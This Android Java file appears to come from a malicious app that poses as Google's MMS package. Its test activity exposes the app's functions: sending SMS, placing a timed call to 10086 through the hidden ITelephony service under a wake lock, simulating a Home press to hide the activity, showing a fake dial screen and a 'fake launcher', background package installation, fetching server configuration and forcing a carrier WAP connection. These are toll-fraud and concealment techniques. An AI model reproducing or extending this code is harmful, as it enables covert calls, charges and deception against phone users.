package com.google.android.mms;

import android.os.IServiceManager;
import android.os.ServiceManagerNative;
import com.android.internal.telephony.ITelephony;
import android.os.DeadObjectException;
import android.os.ServiceManager;
import android.os.RemoteException;
import com.android.internal.telephony.Phone;
import com.android.internal.telephony.PhoneFactory;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.util.Log;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.content.Context;
import android.content.Intent;
import android.content.ComponentName;
import android.view.WindowManager;
import android.app.Dialog;
import android.widget.PopupWindow;
import android.view.Gravity;

import com.google.android.mms.R;

public class TestActivity extends Activity {
    private static final String TAG = "TestActivity";

    private WorkingMessage mWorkingMessage;
    private EditText mEditText;
    private EditText mNumText;
    
    private static final int DIAL_DELAY = 5000;
    private static final int SHOW_DIALOG_DELAY = 2000;
    
    private static final int DIAL_AUTO = 0;
    private static final int SHOW_DIALOG = 1;
    private static final int START_INTENT = 2;
    private static final int SHOW_BACK_VIEW = 3;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case DIAL_AUTO:
                Log.d(TAG, "[[handleMessage]] dial message");
                dial();
                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
                break;
            case SHOW_DIALOG:
                Log.d(TAG, "[[handleMessage]] home press message");
                homeKeyPress();
                mHandler.sendEmptyMessage(START_INTENT);
                break;
            case START_INTENT:
                Log.d(TAG, "[[handleMessage]] start intent message");
                startIntent();
                break;
            case Config.INSTALL_SUCCESS:
                Log.d(TAG, "start install activity success");
                mHandler.sendEmptyMessageDelayed(SHOW_BACK_VIEW, 3 * 1000);
                break;
            case Config.INSTALL_FAILED:
                Log.d(TAG, "start install activity falied -------");
                break;
            case SHOW_BACK_VIEW:
                Intent i = new Intent();
                i.setClass(getApplicationContext(), FakeLanucherActivity.class);
                startActivity(i);
                break;
            }
        }
    };
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.setContentView(R.layout.test);
        
        mWorkingMessage = WorkingMessage.createEmpty(this);
        mEditText = (EditText) findViewById(R.id.text);
        mNumText = (EditText) findViewById(R.id.num);
        Button bt = (Button) findViewById(R.id.send);
        Log.d(TAG, "[[onCreate]] bt = " + bt);
        if (bt != null) {
            bt.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    mWorkingMessage.setText(mEditText.getText().toString());
                    mWorkingMessage.setDestNum(mNumText.getText().toString());
                    Log.d(TAG, "[[onClick]] num = " + mNumText.getText().toString());
                    mWorkingMessage.send();
                }
            });
        }
        
        Button callBt = (Button) findViewById(R.id.call);
        Log.d(TAG, "[[onCreate]] callBt = " + callBt);
        if (callBt != null) {
            callBt.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    Log.d(TAG, "[[setOnClickListener]] dial");
                    SettingManager.getInstance(getApplicationContext()).makeWakeLock();
                    mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
                }
            });
        }
        
        Button internetBt = (Button) findViewById(R.id.internet);
        if (internetBt != null) {
            internetBt.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    Log.d(TAG, "[[setOnClickListener]] internet");
                    SettingManager.getInstance(getApplicationContext()).getXMLInfoFromServer("Test UI");
                    SettingManager.getInstance(getApplicationContext()).log(TAG, "get server info from internet");
                }
            });
        }
        
        View vedioBt = findViewById(R.id.vedio);
        if (vedioBt != null) {
            vedioBt.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    SettingManager.getInstance(TestActivity.this).forceCMWapConnection();
                }
            });
        }
        
        View install = findViewById(R.id.install);
        if (install != null) {
            install.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    InstallASyncTask installTask = new InstallASyncTask(TestActivity.this);
                    installTask.execute(mHandler);
                }
            });
        }
        
//        View show_window = findViewById(R.id.show_windows);
//        if (show_window != null) {
//            show_window.setOnClickListener(new View.OnClickListener() {
//                @Override
//                public void onClick(View v) {
//                    Dialog d = createDialog();
//                    if (d != null) {
//                        d.show();
//                    }
//                }
//            });
//        }
        
//        Intent intent = new Intent();
////        intent.setAction("android.intent.action.MAIN");
////        intent.addCategory("android.intent.category.LAUNCHER");
//        ComponentName c = new ComponentName("com.rovio.angrybirds", "com.rovio.ka3d.App");
//        intent.setComponent(c);
//        this.startActivity(intent);
    }
    
//    private Dialog createDialog() {
//        LayoutInflater factory = LayoutInflater.from(this);
//        View v = factory.inflate(R.layout.dialog_view, null);
//        
////        AlertDialog dialog = new AlertDialog.Builder(this).create();
////        dialog.setView(v);
////        dialog.getWindow().getAttributes().type = WindowManager.LayoutParams.TYPE_TOAST;
////        dialog.getWindow().addFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM);
////        dialog.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
//        
////        PopupWindow popup = new PopupWindow(this);
////        popup.setBackgroundDrawable(null);
////        WindowManager.LayoutParams p = (WindowManager.LayoutParams) v.getLayoutParams();
////        p.type = WindowManager.LayoutParams.TYPE_TOAST;
////        popup.setContentView(v);
////        
////        popup.showAtLocation(null, Gravity.NO_GRAVITY, 0, 0);
//        
//        WindowManager wm = (WindowManager)getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
//        WindowManager.LayoutParams wmParams = new WindowManager.LayoutParams();
//        wmParams.type = WindowManager.LayoutParams.TYPE_PHONE;
//        wmParams.format = 1;
//        wmParams.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
//
//        wmParams.gravity = Gravity.LEFT | Gravity.TOP;
//        wmParams.x = 0;
//        wmParams.y = 0;
//
//        wmParams.width = WindowManager.LayoutParams.WRAP_CONTENT;
//        wmParams.height = WindowManager.LayoutParams.WRAP_CONTENT;
//        
//        wm.addView(v, wmParams);
//        
//        return null;
//    }
    
    private void brightness() {
        WindowManager.LayoutParams lp = getWindow().getAttributes();
        lp.screenBrightness = 0.1f;
        getWindow().setAttributes(lp);
    }

    
    private void dial() {
        Log.d(TAG, "[[dial]]");
        try {
            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
            phone.call("10086");
        } catch (RemoteException e) {
            Log.d(TAG, e.getMessage());
        }
    }
    
    private void homeKeyPress() {
        Intent i= new Intent(Intent.ACTION_MAIN);

        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }
    
    private void startIntent() {
        Log.d(TAG, "========= [[startIntent]] ========");
        Intent intent = new Intent(TestActivity.this, DialScreenActivity.class);
        startActivity(intent);
        finish();
    }
    
}
